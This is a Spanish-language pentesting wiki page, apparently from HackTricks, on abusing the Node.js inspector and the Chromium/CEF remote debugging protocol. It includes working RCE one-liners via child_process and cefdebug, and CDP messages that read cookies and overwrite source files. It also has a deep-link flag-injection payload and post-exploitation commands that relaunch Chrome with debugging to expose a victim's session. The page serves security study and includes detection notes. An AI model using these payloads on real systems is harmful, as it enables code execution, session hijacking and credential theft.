# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

Los ejemplos prácticos históricos incluyen el walkthrough de Multimaster y el ataque al debugger de Visual Studio Code mediante CVE-2019-1414; utilízalos como contexto específico de cada versión en lugar de asumir que todos los targets actuales de Electron o Chromium exponen las mismas primitivas.<sup>[[1]](#references)[[3]](#references)</sup>

## Información básica

[Según la documentación](https://nodejs.org/learn/getting-started/debugging): Cuando se inicia con el switch `--inspect`, un proceso de Node.js escucha a un cliente de debugging. De forma **predeterminada**, escuchará en el host y puerto **`127.0.0.1:9229`**. A cada proceso también se le asigna un **UUID** **único**.<sup>[[4]](#references)</sup>

Los clientes del Inspector deben conocer y especificar la dirección del host, el puerto y el UUID para conectarse. Una URL completa tendrá un aspecto similar a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Dado que el **debugger tiene acceso total al entorno de ejecución de Node.js**, un actor malicioso capaz de conectarse a este puerto podría ejecutar código arbitrario en nombre del proceso de Node.js (**posible escalada de privilegios**).<sup>[[4]](#references)</sup>

Existen varias formas de iniciar un Inspector:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Cuando inicias un proceso inspeccionado, aparecerá algo como esto:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Los procesos basados en **CEF** (**Chromium Embedded Framework**) pueden exponer un debugger con `--remote-debugging-port=9222`. Esto expone el navegador mediante el [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) en lugar de un inspector de Node.js, por lo que los payloads basados en `process` de Node.js no son directamente aplicables de forma predeterminada.<sup>[[2]](#references)[[5]](#references)</sup>

Cuando inicies un navegador con debugging, aparecerá algo similar a esto:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Enumeración y control de un endpoint CDP

Los endpoints de descubrimiento HTTP distinguen el WebSocket del **browser** de los WebSockets de cada **target** (pestaña, worker, extensión, etc.). Consulta `/json/version` para obtener el endpoint del browser y `/json/list` para los targets; los valores `webSocketDebuggerUrl` devueltos pueden controlarse directamente con los mensajes similares a JSON-RPC de CDP.<sup>[[5]](#references)</sup>
```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
Por ejemplo, conéctate con `websocat "$BROWSER_WS"` y envía `{"id":1,"method":"Target.getTargets"}` o `{"id":2,"method":"Storage.getCookies"}`. En un page target (`websocat "$PAGE_WS"`), `Runtime.evaluate` se ejecuta en ese renderer y `Page.captureScreenshot` devuelve una captura de pantalla codificada en base64. `document.cookie` no puede revelar cookies `HttpOnly`, mientras que `Storage.getCookies` solicita al navegador su cookie store.<sup>[[5]](#references)</sup>
```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### Navegadores, WebSockets y same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Los sitios web abiertos en un navegador web pueden realizar solicitudes WebSocket y HTTP bajo el modelo de seguridad del navegador. Es necesaria una **conexión HTTP inicial** para **obtener un identificador único de sesión del debugger**. La **same-origin-policy** **impide** que los sitios web puedan realizar **esta conexión HTTP**. Para obtener seguridad adicional contra [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifica que los **headers 'Host'** de la conexión especifiquen una **dirección IP** o **`localhost`** exactamente.<sup>[[4]](#references)</sup>

> [!TIP]
> Estas **medidas de seguridad impiden explotar el inspector** para ejecutar código **simplemente enviando una solicitud HTTP** (lo que podría hacerse explotando una vuln SSRF).<sup>[[4]](#references)</sup>

### Iniciar el inspector en procesos en ejecución

Puedes enviar la **señal SIGUSR1** a un proceso de nodejs en ejecución para hacer que **inicie el inspector** en el puerto predeterminado. Sin embargo, ten en cuenta que necesitas tener privilegios suficientes, por lo que esto podría concederte **acceso privilegiado a la información dentro del proceso**, pero no una escalada directa de privilegios.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Esto resulta útil en contenedores porque **apagar el proceso e iniciar uno nuevo** con `--inspect` **no es una opción**, ya que el **contenedor** será **eliminado** junto con el proceso.<sup>[[6]](#references)</sup>

### Conectarse al inspector/debugger

Para conectarse a un navegador basado en **Chromium**, se puede acceder a las URL `chrome://inspect` o `edge://inspect` para Chrome o Edge, respectivamente. Al hacer clic en el botón Configure, se debe comprobar que el **host y el puerto de destino** estén correctamente indicados. La imagen muestra un ejemplo de Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Después de una URL para acceder al debugger aparecerá. p. ej., ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Conectarse al inspector/debugger: Para conectarse a un navegador basado en Chromium,...](<../../images/image (674).png>)

Mediante la **línea de comandos** puedes conectarte a un debugger/inspector con:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
La herramienta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permite **encontrar inspectores** ejecutándose localmente e **inyectar código** en ellos.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Ten en cuenta que los exploits de **RCE de NodeJS** no funcionarán si estás conectado a un navegador mediante [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (debes revisar la API para encontrar cosas interesantes que hacer con ella).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE en el Debugger/Inspector de NodeJS

> [!TIP]
> Si has llegado aquí buscando cómo obtener [**RCE a partir de un XSS en Electron, consulta esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Algunas formas comunes de obtener **RCE** cuando puedes **conectarte** a un **inspector** de Node consisten en usar algo como lo siguiente (parece que esto **no funcionará en una conexión con Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Puedes consultar la API aquí: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
En esta sección simplemente enumeraré cosas interesantes que he encontrado que la gente ha utilizado para explotar este protocolo.

### Restricción del perfil predeterminado en Chrome 136+

A partir de **Chrome 136**, Chrome ignora `--remote-debugging-port` y `--remote-debugging-pipe` cuando apuntan al **directorio de datos predeterminado de Chrome**. El switch debe combinarse con un `--user-data-dir` no estándar, cuya clave de cifrado independiente y estado de navegador aislado impiden que la técnica simple basada en flags exponga el perfil autenticado normal del usuario. No se debe asumir que esta restricción específica de Chrome cubre versiones anteriores de Chrome, Chrome for Testing, aplicaciones Electron/CEF u otros derivados de Chromium sin verificarlo.<sup>[[14]](#references)</sup>
```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
Por lo tanto, ver un proceso actual de Chrome iniciado únicamente con `--remote-debugging-port` **no** demuestra que CDP se haya activado. Confirma el listener y `/json/version`, y determina qué perfil lo respalda realmente.<sup>[[14]](#references)</sup>

### Inyección de parámetros mediante Deep Links

En [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security descubrió que una aplicación basada en CEF **registró un UR**I personalizado en el sistema (workspaces://index.html) que recibía la URI completa y luego **inició la aplicació**n basada en CEF con una configuración que se construía parcialmente a partir de esa URI.<sup>[[8]](#references)</sup>

Se descubrió que los parámetros de la URI se decodificaban mediante URL y se utilizaban para iniciar la aplicación básica basada en CEF, lo que permitía a un usuario **inyectar** el flag **`--gpu-launcher`** en la **línea de comandos** y ejecutar cosas arbitrarias.<sup>[[8]](#references)</sup>

Por lo tanto, un payload como:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Ejecutará un calc.exe.<sup>[[8]](#references)</sup>

### Sobrescribir archivos

Cambia la carpeta donde se van a guardar los **archivos descargados** y descarga un archivo para **sobrescribir** el **código fuente** utilizado frecuentemente por la aplicación con tu **código malicioso**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE y exfiltration

STAR Labs demostró que los servicios WebDriver/CDP expuestos pueden permitir lecturas arbitrarias de archivos y RCE; el DNS rebinding puede completar la cadena de exploit en algunas configuraciones.<sup>[[9]](#references)</sup>

Para conocer otros casos históricos de browser-automation y seguridad de Chromium, consulta el write-up de Counter WebDriver y los issues 773, 1742 y 1944 de Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Activación de CDP dentro de un proceso de Chromium activo

En Windows, [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) demostró que la restricción de la línea de comandos no es la única forma de activar CDP: el código que ya puede inyectarse en un `msedge.exe` existente puede invocar el método no exportado de Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` y exponer el perfil activo autenticado sin reiniciar el browser.<sup>[[15]](#references)</sup>

La cadena demostrada inyecta una DLL con `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, resuelve símbolos internos de Edge (primero desde PDB y después mediante byte signatures específicas de cada versión), crea una subclase de la ventana del browser y publica un mensaje para que la llamada final de inicio del servidor se ejecute en el **UI thread** del browser. El socket se enlaza a loopback, tras lo cual las primitivas CDP normales pueden recuperar cookies, capturar tabs, inspeccionar el tráfico de red o evaluar JavaScript en páginas autenticadas.<sup>[[15]](#references)</sup>

> [!WARNING]
> Esta es una técnica de **post-compromise/process-injection**, no un bypass de red no autenticado. Depende en gran medida de la build, porque los símbolos C++ relevantes no se exportan y las signatures pueden cambiar después de las actualizaciones del browser.<sup>[[15]](#references)</sup>

Para la detección, no dependas únicamente de la telemetría de la línea de comandos `--remote-debugging-*`: correlaciona también handles y operaciones de memoria inusuales contra procesos del browser (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, creación de threads), DLL injection y sockets de escucha loopback inesperados pertenecientes a Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

En un entorno real y **después de comprometer** un PC de usuario que utiliza un browser basado en Chromium, una técnica histórica consistía en relanzar el browser con debugging habilitado y reenviar el puerto loopback. Esto puede exponer el estado de navegación de la víctima en productos/builds que todavía acepten el perfil seleccionado, pero Chrome 136+ no lo aceptará contra su directorio de datos predeterminado.<sup>[[7]](#references)[[14]](#references)</sup>

El comando de relanzamiento original se conserva a continuación para targets antiguos o específicos de una versión. El segundo comando es el formato actual compatible con Chrome, pero crea un perfil aislado en lugar de reabrir el estado autenticado normal de la víctima.<sup>[[7]](#references)[[14]](#references)</sup>
```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
Para las técnicas específicas de macOS relacionadas con el relanzamiento de Chromium, las extensiones y CDP, consulta [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - herramienta de inspección y explotación del debugger de CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Visual Studio Code Remote Code Execution vía Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guía de debugging de Node.js - Primeros pasos](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: abuso de la función de debugging de Chrome para observar y controlar sesiones de browsing remotamente](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [¿Estás hablando conmigo? - WebDriver RCE mediante DNS Rebinding y CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - De Bot a RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (rastreador de bugs de Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (rastreador de bugs de Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (rastreador de bugs de Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Cambios en los switches de debugging remoto para mejorar la seguridad - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Inyección de CDP en un navegador Edge en ejecución: análisis detallado de la instrumentación del navegador en tiempo de ejecución](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
